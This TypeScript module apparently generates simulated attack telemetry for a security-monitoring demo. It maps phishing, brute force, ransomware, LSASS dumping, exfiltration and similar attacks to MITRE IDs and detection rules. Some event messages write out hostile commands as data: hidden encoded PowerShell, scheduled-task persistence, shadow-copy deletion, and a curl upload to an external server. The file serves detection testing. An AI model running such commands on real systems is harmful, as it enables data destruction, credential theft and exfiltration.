import type { ClientId, RiskEvent, Severity } from './types';

export type AttackType =
  | 'brute' | 'phish' | 'powershell' | 'ransomware' | 'exfil' | 'anomalous_login' | 'payment'
  | 'cred_dump' | 'priv_account' | 'persistence' | 'ledger_tamper';

export interface AttackDef {
  id: AttackType;
  label: string;
  mitre: string;
  tactic: string;
  severity: Severity;
  ruleId: string | null;
  description: string;
  targetKind: 'host' | 'user' | 'ledger';
}

export const ATTACKS: AttackDef[] = [
  { id: 'phish', label: 'Credential phishing', mitre: 'T1566.002', tactic: 'Initial Access', severity: 'HIGH', ruleId: 'rb-006', description: 'Spoofed message lures a user to a fake login page; the stolen password is replayed from a proxy.', targetKind: 'user' },
  { id: 'brute', label: 'Password brute force', mitre: 'T1110', tactic: 'Credential Access', severity: 'MEDIUM', ruleId: 'rb-001', description: 'Rapid failed logins from a single scanner address against an exposed login.', targetKind: 'host' },
  { id: 'anomalous_login', label: 'Foreign VPN login', mitre: 'T1078', tactic: 'Defense Evasion', severity: 'HIGH', ruleId: 'rb-008', description: 'Valid credentials used on the VPN from a foreign, known-bad address.', targetKind: 'user' },
  { id: 'powershell', label: 'Encoded PowerShell', mitre: 'T1059.001', tactic: 'Execution', severity: 'HIGH', ruleId: 'rb-002', description: 'Hidden, base64-encoded PowerShell followed by a call-out to a C2 server.', targetKind: 'host' },
  { id: 'persistence', label: 'Scheduled task persistence', mitre: 'T1053.005', tactic: 'Persistence', severity: 'MEDIUM', ruleId: 'rb-003', description: 'A scheduled task is planted to re-run a script from a user folder.', targetKind: 'host' },
  { id: 'cred_dump', label: 'LSASS credential dumping', mitre: 'T1003', tactic: 'Credential Access', severity: 'CRITICAL', ruleId: 'rb-004', description: 'A process reads LSASS memory to harvest cached passwords.', targetKind: 'host' },
  { id: 'priv_account', label: 'Rogue admin account', mitre: 'T1136', tactic: 'Persistence', severity: 'HIGH', ruleId: 'rb-005', description: 'A new account with administrator rights is created outside change control.', targetKind: 'user' },
  { id: 'ransomware', label: 'Ransomware', mitre: 'T1490', tactic: 'Impact', severity: 'CRITICAL', ruleId: 'rb-007', description: 'Fake installer deletes shadow copies, mass-renames files and contacts ransomware C2.', targetKind: 'host' },
  { id: 'exfil', label: 'Data exfiltration', mitre: 'T1048', tactic: 'Exfiltration', severity: 'HIGH', ruleId: 'rb-009', description: 'Large archives uploaded to an untrusted external server.', targetKind: 'host' },
  { id: 'payment', label: 'Off-hours payment fraud', mitre: 'T1657', tactic: 'Impact', severity: 'CRITICAL', ruleId: 'rb-010', description: 'High-value transfer to an external beneficiary in the middle of the night.', targetKind: 'user' },
  { id: 'ledger_tamper', label: 'Audit log tampering (insider)', mitre: 'T1565.001', tactic: 'Impact', severity: 'CRITICAL', ruleId: null, description: 'An insider edits a stored audit record to cover their tracks, without recomputing its hash.', targetKind: 'ledger' },
];

export const attackById = (id: AttackType) => ATTACKS.find((a) => a.id === id)!;

const DEFAULT_TARGETS: Record<string, Partial<Record<AttackType, string>>> = {
  meezan: { brute: 'ibanking-web-01', phish: 'customer.tariq', powershell: 'branch-ws-07', ransomware: 'branch-ws-07', exfil: 'core-db-02', anomalous_login: 'staff.farooq', payment: 'ops.batch', cred_dump: 'branch-dc-01', priv_account: 'svc.backup2', persistence: 'teller-ws-12' },
  shu: { brute: 'admissions-web-01', phish: 'faculty.ahmed', powershell: 'lab-pc-04', ransomware: 'lab-pc-18', exfil: 'admissions-web-01', anomalous_login: 'faculty.sara', payment: 'finance.fees', cred_dump: 'campus-dc-01', priv_account: 'it.helpdesk9', persistence: 'lab-pc-22' },
  contour: { brute: 'ci-build-01', phish: 'dev.usman', powershell: 'dev-ws-042', ransomware: 'dev-ws-108', exfil: 'git-srv-01', anomalous_login: 'dev.bilal', payment: 'payroll.batch', cred_dump: 'build-dc-01', priv_account: 'jenkins.admin2', persistence: 'dev-ws-077' },
};
const GENERIC: Record<AttackType, string> = {
  brute: 'web-01', phish: 'user.finance', powershell: 'ws-014', ransomware: 'ws-021', exfil: 'fileserver-01', anomalous_login: 'user.remote', payment: 'ops.payments', cred_dump: 'dc-01', priv_account: 'svc.shadow', persistence: 'ws-030', ledger_tamper: 'audit-ledger',
};

/** Phishing domain per org. Orgs without their own spoofed domain reuse a generic credential-harvest page. */
const PHISH_DOMAIN: Record<string, string> = { meezan: 'meezan-fake-login.com', shu: 'shu-admissions-phish.com' };

export const defaultTarget = (client: ClientId, type: AttackType) => DEFAULT_TARGETS[client]?.[type] ?? GENERIC[type];

export type GenEvent = Partial<RiskEvent> & { delayMs: number };

/**
 * Generates inert simulated events. Higher intensity (1-5) = more events and faster spacing.
 * `delayMs` is how long the launcher waits before sending each event.
 */
export function generate(type: AttackType, client: ClientId, target: string, intensity: number, start = Date.now()): GenEvent[] {
  const lvl = Math.max(1, Math.min(5, Math.round(intensity)));
  const gap = Math.round(1400 / lvl);
  const t = (i: number) => new Date(start + i * gap).toISOString();
  const base = { client, origin: 'demo' as const };
  const out: Omit<GenEvent, 'delayMs'>[] = [];
  const tgt = target.trim().toLowerCase() || defaultTarget(client, type);

  switch (type) {
    case 'brute': {
      const n = 5 + lvl * 2;
      for (let i = 0; i < n; i++) out.push({ ...base, ts: t(i), source: 'web', host: tgt, user: ['admin', 'root', 'test', 'operator', 'support'][i % 5], ip: '1.2.3.4', action: 'login_failed', message: `Failed login attempt ${i + 1} from 1.2.3.4` });
      break;
    }
    case 'phish': {
      const domain = PHISH_DOMAIN[client] ?? 'shu-admissions-phish.com';
      for (let k = 0; k < Math.ceil(lvl / 2); k++) {
        out.push({ ...base, ts: t(out.length), source: 'proxy', host: 'mail-gw-01', user: tgt, ip: '203.0.113.88', domain, action: 'link_click', message: `Clicked link to ${domain}` });
      }
      out.push({ ...base, ts: t(out.length), source: 'web', host: 'portal-web-01', user: tgt, ip: '203.0.113.88', action: 'login_success', message: 'Login from untrusted proxy after link click' });
      break;
    }
    case 'powershell':
      for (let k = 0; k < lvl; k++) out.push({ ...base, ts: t(out.length), source: 'endpoint', host: tgt, user: 'local.user', process: 'powershell.exe', action: 'process_start', message: 'powershell.exe -NoProfile -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQ==' });
      out.push({ ...base, ts: t(out.length), source: 'endpoint', host: tgt, process: 'powershell.exe', action: 'net_connect', ip: '198.51.100.99', message: 'Outbound connection to 198.51.100.99:443' });
      break;
    case 'persistence':
      out.push({ ...base, ts: t(0), source: 'endpoint', host: tgt, user: 'local.user', process: 'schtasks.exe', action: 'process_start', message: 'schtasks /create /sc onlogon /tn "OneDrive Sync Helper" /tr C:\\Users\\Public\\AppData\\sync.ps1' });
      for (let k = 1; k < lvl; k++) out.push({ ...base, ts: t(k), source: 'endpoint', host: tgt, process: 'powershell.exe', action: 'process_start', message: 'powershell.exe -File C:\\Users\\Public\\AppData\\sync.ps1' });
      break;
    case 'cred_dump':
      out.push({ ...base, ts: t(0), source: 'endpoint', host: tgt, user: 'svc.update', process: 'rundll32.exe', action: 'process_access', message: 'rundll32.exe opened a read handle to lsass.exe memory (comsvcs MiniDump pattern)' });
      for (let k = 1; k < lvl; k++) out.push({ ...base, ts: t(k), source: 'endpoint', host: tgt, process: 'rundll32.exe', action: 'file_write', message: `C:\\Windows\\Temp\\dbg${k}.dmp written (${120 + k * 8} MB)` });
      break;
    case 'priv_account':
      out.push({ ...base, ts: t(0), source: 'syslog', host: 'dc-01', user: tgt, action: 'user_created', meta: { privileged: true, group: 'Domain Admins' }, message: `New account ${tgt} added to Domain Admins outside change window` });
      break;
    case 'ransomware':
      out.push({ ...base, ts: t(0), source: 'endpoint', host: tgt, process: 'free_tool_setup.exe', action: 'process_start', message: 'Installer launched from Downloads' });
      out.push({ ...base, ts: t(1), source: 'endpoint', host: tgt, process: 'vssadmin.exe', action: 'process_start', message: 'vssadmin delete shadows /all /quiet' });
      for (let k = 0; k < lvl; k++) out.push({ ...base, ts: t(2 + k), source: 'endpoint', host: tgt, process: 'free_tool_setup.exe', action: 'file_rename_bulk', meta: { count: 400 * (k + 2) }, message: `${400 * (k + 2)} files renamed with a new extension` });
      out.push({ ...base, ts: t(2 + lvl), source: 'gateway', host: tgt, action: 'dns_query', domain: 'ransomware-c2.net', message: 'DNS lookup for ransomware-c2.net' });
      break;
    case 'exfil':
      for (let k = 0; k < lvl; k++) out.push({ ...base, ts: t(k), source: 'endpoint', host: tgt, process: 'curl', action: 'net_upload', ip: '198.51.100.44', meta: { bytes: 500_000_000 * (k + 1) }, message: `curl -T export_part${k + 1}.zip https://198.51.100.44/upload (${(0.5 * (k + 1)).toFixed(1)} GB)` });
      break;
    case 'anomalous_login':
      for (let k = 0; k < Math.ceil(lvl / 2); k++) out.push({ ...base, ts: t(k), source: 'vpn', host: 'vpn-gw-01', user: tgt, ip: '198.51.100.99', meta: { geo: 'Foreign (baseline: Karachi, PK)' }, action: 'login_success', message: 'VPN login from foreign geography' });
      break;
    case 'payment':
      for (let k = 0; k < Math.ceil(lvl / 2); k++) out.push({ ...base, ts: t(k), source: 'payments', host: 'payments-gw-01', user: tgt, ip: '198.51.100.44', meta: { amount: 100000 * (k + 2), hour: 2 }, action: 'transfer', message: `Off-hours transfer of ${(100000 * (k + 2)).toLocaleString('en-US')} to external beneficiary at 02:${String(10 + k).padStart(2, '0')}` });
      break;
    case 'ledger_tamper':
      break;
  }
  return out.map((e, i) => ({ ...e, delayMs: i === 0 ? 0 : gap }));
}

// Backwards-compatible list used by tests.
export const ATTACK_TYPES = ATTACKS.filter((a) => a.ruleId);
